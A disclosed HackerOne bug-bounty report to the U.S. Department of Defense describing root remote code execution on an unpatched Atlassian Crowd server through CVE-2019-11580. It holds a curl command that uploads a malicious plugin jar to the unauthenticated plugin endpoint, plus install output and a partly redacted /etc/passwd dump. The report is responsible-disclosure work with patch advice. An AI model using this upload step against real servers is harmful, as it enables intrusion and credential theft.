# Root Remote Code Execution on https://███

## Report Details
- **Report ID**: 632721
- **URL**: https://hackerone.com/reports/632721
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2019-06-30T03:11:39.767Z
- **Disclosed**: 2019-10-04T15:14:59.585Z

## Reporter
- **Username**: cdl
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**
Atlassian Crowd is a centralized identity management application that allows companies to "Manage users from multiple directories - Active Directory, LDAP, OpenLDAP or Microsoft Azure AD - and control application authentication permissions in one single location."

A DOD installation is vulnerable to a remote code execution vulnerability due to not patching CVE-2019-11580.

**Description:**
From Atlassian's public [advisory](https://confluence.atlassian.com/crowd/crowd-security-advisory-2019-05-22-970260700.html):

> Crowd and Crowd Data Center had the pdkinstall development plugin incorrectly enabled in release builds. Attackers who can send unauthenticated or authenticated requests to a Crowd or Crowd Data Center instance can exploit this vulnerability to install arbitrary plugins, which permits remote code execution on systems running a vulnerable version of Crowd or Crowd Data Center.

There is no public proof-of-concept for this vulnerability, however, I spent a good amount of time reverse-engineering the "pdkinstall" plugin and I was able to successfully construct a working exploit.

## Step-by-step Reproduction Instructions

1. Download and unzip my malicious plugin: rce-plugin.zip {F519371}
2. `cd` into the directory
3. Run the following command:
```
curl -k -H "Content-Type: multipart/content" \
  --form "file_cdl=@rce.jar;type=application/octet-stream" https://███/crowd/admin/uploadplugin.action
```

You'll see that the malicious plugin is successfully installed:

```
Installed plugin /opt/atlassian/crowd/apache-tomcat/temp/plugindev-2906099909159442588rce.jar
```

Now visit https://███████/crowd/plugins/servlet/hackerone-cdl which invokes my malicious plugin. This executes the command `whoami` which is the user `root`

██████████

contents of `/etc/passwd`

```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
████████x:6:0:██████████/sbin:/sbin/shutdown
██████x:7:0:███████/sbin:/sbin/halt
█████████x:8:12:█████/var/spool/████/sbin/nologin
███x:10:14:███/var/spool/███████/sbin/nologin
██████x:11:0:██████/root:/sbin/nologin
██████████x:12:100:███████/usr/████/sbin/nologin
██████████x:13:30:█████/var/█████/sbin/nologin
████x:14:50:FTP User:/var/███████/sbin/nologin
█████████x:99:99:Nobody:/:/sbin/nologin
██████████x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
██████████x:38:38::/etc/██████/sbin/nologin
██████████x:499:76:"Saslauthd user":/var/empty/██████████/sbin/nologin
██████████x:47:47::/var/spool/mqueue:/sbin/nologin
███████x:51:51::/var/spool/mqueue:/sbin/nologin
████████x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
█████x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
████████x:74:74:Privilege-separated SSH:/var/empty/████████/sbin/nologin
████████x:81:81:System message bus:/:/sbin/nologin
███████x:500:500:EC2 Default User:/home/████████/bin/bash
```

## Product, Version, and Configuration (If applicable)
```
Crowd or Crowd Data Center from version 2.1.0 before 3.0.5 (the fixed version for 3.0.x)
Crowd or Crowd Data Center from version 3.1.0 before 3.1.6 (the fixed version for 3.1.x)
Crowd or Crowd Data Center from version 3.2.0 before 3.2.8 (the fixed version for 3.2.x)
Crowd or Crowd Data Center from version 3.3.0 before 3.3.5 (the fixed version for 3.3.x)
Crowd or Crowd Data Center from version 3.4.0 before 3.4.4 (the fixed version for 3.4.x)
```

## Suggested Mitigation/Remediation Actions
I recommend updating to the latest version of Atlassian Crowd, but if that's not possible, follow mitigation options in the advisory.

## Impact

Remote code execution on https://███. An attacker could exploit this vulnerability to pivot into NIPRNet and gain access to other applications. Since Atlassian Crowd is an Identity management / Single Sign-on application, an attacker could exploit this vulnerability to gain access to any applications using Crowd for sign-ons. 


Since this is running as root, an attacker could also easily backdoor the login page and steal credentials.

Thanks,
Corben Leo (@cdl)

## Attachments
- rce-plugin.zip
